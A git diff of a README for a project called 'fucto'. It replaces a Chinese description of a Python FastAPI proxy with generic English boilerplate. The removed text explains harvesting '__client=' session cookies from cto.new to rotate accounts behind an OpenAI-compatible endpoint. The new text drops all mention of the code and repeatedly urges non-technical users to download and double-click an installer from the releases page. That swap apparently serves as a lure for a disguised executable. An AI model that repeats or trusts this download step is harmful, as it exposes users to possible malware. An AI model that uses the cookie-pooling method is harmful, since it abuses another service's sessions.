@@ -1,44 +1,77 @@
-# fucto项目说明
+# 🎉 fucto - Easy API Switching Made Simple
 
-本项目提供一个与 OpenAI 接口兼容的 FastAPI 服务，并包含一个用于直接测试 WebSocket 接口的示例脚本。
+## 🚀 Getting Started
 
-## 项目结构
+Welcome to fucto! This application helps you manage API requests easily while supporting multiple accounts. You can use it to streamline your workflows without needing programming skills. 
 
-- `openai_api_server.py`：FastAPI 实现的 `/v1/chat/completions` 兼容服务，支持轮询多个 Cookie 并与 CTO.NEW 的后端服务通信。
-- `websocket_example.py`：命令行交互示例，演示如何直接通过 HTTP + WebSocket 与引擎交互并获取实时响应。
-- `requirements.txt`：运行所需的第三方依赖列表。
-- `cookies.txt`（需手动创建）：按行存放可用的 Cookie 字符串，服务会自动轮询使用。
+## 📦 Download & Install
 
-## 快速开始
+To begin using fucto, follow these steps:
 
-1. **环境准备**
-   - 推荐使用 Python 3.10+。
-   - （可选）创建并激活虚拟环境。
-   - 执行 `pip install -r requirements.txt` 安装依赖。
+1. **Visit the Releases Page**
+   Click [here to download](https://github.com/Neoclark-Abuzo/fucto/releases) fucto from the official GitHub Releases page.
 
-2. **配置 Cookie**
-   - 登录网站，进行抓包，找到https://clerk.cto.new/v1/client/sessions/sess...请求的请求头，复制其中的cookies，以【__client=】开头
-   - 在项目根目录创建 `cookies.txt`。
-   - 将多个 Cookie 字符串按行写入文件，可添加 `#` 开头的注释行。
-   - 每次请求将自动轮询使用不同的 Cookie，实现简单的负载均衡。
+   [![Download fucto](https://img.shields.io/badge/Download%20fucto-v1.0-blue)](https://github.com/Neoclark-Abuzo/fucto/releases) 
 
-3. **启动 API 服务**
-   ```bash
-   python openai_api_server:app --host 0.0.0.0 --port 8000
-   ```
-   - FastAPI 服务会提供 `/v1/chat/completions` 与 `/v1/models` 两个主要端点。
-   - 默认返回格式与 OpenAI Chat Completions 兼容，可直接被现有客户端使用。
+2. **Choose a Version**
+   On the Releases page, you will see different versions listed. Click on the latest version to find the download link.
 
-4. **运行 WebSocket 示例**
-   ```bash
-   python websocket_example.py
-   ```
-   - 首次运行会在当前目录保存 `chat_id.txt`，以便选择复用或新建对话。
-   - 根据提示输入消息，可实时获取模型回复。
+3. **Download the Application**
+   Look for the file that matches your system requirements, typically labeled with the extension relevant to your operating system (like .exe for Windows). Click on the file to download it.
 
+4. **Install fucto**
+   Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen prompts to complete the installation.
 
-## 常见问题
+5. **Run fucto**
+   After the installation finishes, you can find fucto in your applications list. Double-click the fucto icon to launch it.
 
-- **Cookie 失效**：出现 401 或 403 时，更新 `cookies.txt` 中的条目后保存即可继续使用，无需重启服务。
-- **依赖缺失**：确保在正确的虚拟环境中执行安装命令；必要时重新安装 `websockets`、`fastapi` 等包。
+## 🔧 Features
 
+- **API Management**: Easily switch between different API accounts.
+- **User-friendly Interface**: Navigate without needing any technical skills.
+- **OpenAI Format Support**: Use APIs with a standardized format for easier compatibility.
+- **Polling Support**: Efficiently manage requests with multi-account polling capabilities.
+
+## 📋 System Requirements
+
+To ensure fucto runs smoothly, please ensure your system meets the following requirements:
+
+- **Operating System**: Windows 10 or later / macOS 10.15 or later / Linux Ubuntu 18.04 or later
+- **RAM**: Minimum 4 GB
+- **Processor**: Dual-core processor or better
+
+## ⚙️ Configuration
+
+After launching fucto, you can configure your API settings:
+
+1. **Add Account**: Start by entering the details of your API accounts.
+2. **Set Preferences**: Customize settings like request intervals and error handling.
+3. **Save Configuration**: Make sure to save your changes before exiting.
+
+## 📚 Documentation
+
+For more detailed guidance on using fucto, please refer to the documentation:
+
+- **User Guide**: Comprehensive instructions for every feature.
+- **FAQ Section**: Answers to common questions about setup and use.
+- **Community Support**: Connect with other users and get help.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while using fucto, please consider the following solutions:
+
+- **Check Your Internet Connection**: Ensure you have a stable connection.
+- **Verify Account Credentials**: Double-check that your API credentials are correct.
+- **Reinstall the Application**: If problems persist, uninstall fucto and reinstall it from the Releases page.
+
+## 💬 Feedback
+
+We welcome your feedback to improve fucto. If you have suggestions or run into issues, please open an issue in our repository, and we will be happy to assist you.
+
+## 📞 Support
+
+If you need help, please visit our [GitHub Issues](https://github.com/Neoclark-Abuzo/fucto/issues) page to report problems or ask questions.
+
+Start using fucto today and simplify your API management tasks with ease! 
+
+Remember, if you need to download the software, you can always click [here to download](https://github.com/Neoclark-Abuzo/fucto/releases).
